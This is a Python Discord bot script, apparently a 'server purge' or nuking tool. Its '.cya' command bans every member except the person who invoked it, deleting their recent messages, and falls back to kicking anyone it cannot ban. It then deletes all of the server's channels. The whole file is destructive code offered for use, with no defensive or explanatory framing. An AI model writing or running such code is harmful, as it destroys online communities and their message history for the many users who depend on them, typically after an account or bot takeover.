import discord
from discord.ext import commands

client = commands.Bot(command_prefix=".")
token = ""


@client.event
async def on_ready():
    print("-------")
    print("Logged in as:")
    print("User: " + client.user.name + "#" + client.user.discriminator)
    print("ID: " + client.user.id)
    print("Server Purge")
    print("-------")


@client.command(pass_context=True)
async def cya(ctx):

    server = ctx.message.server
    author = ctx.message.author


    #  banning everyone

    print("User wipe started.")
    for member in list(server.members):

        banint = 0
        kickint = 0

        if member == author:
            print("Not banning initiator.")  # makes the bot not ban whoever uses command
        else:
            # in-case you cant ban someone due to perms, roles, etc.
            try:
                await client.ban(member, delete_message_days=7)
                banint += 1
                print("Banned member count: {}.".format(banint))
            except Exception as e:
                print(e)
                try:
                    await client.kick(member)   # tries to kick if no perms to ban
                    kickint += 1
                    print("Kicked member count: {}.".format(kickint))
                except Exception as e:
                    print(e)
                    pass
    print("Done wiping.")

    #  deleting channels

    print("Mass channel deletion started.")

    for channel in list(server.channels):
        try:
            await client.delete_channel(channel)
            print("Deleting channel [{}]".format(channel.name))
        except Exception as e:
            print(e)
            pass

    print("Done deleting.")

    print("Finished.")

client.run(token)
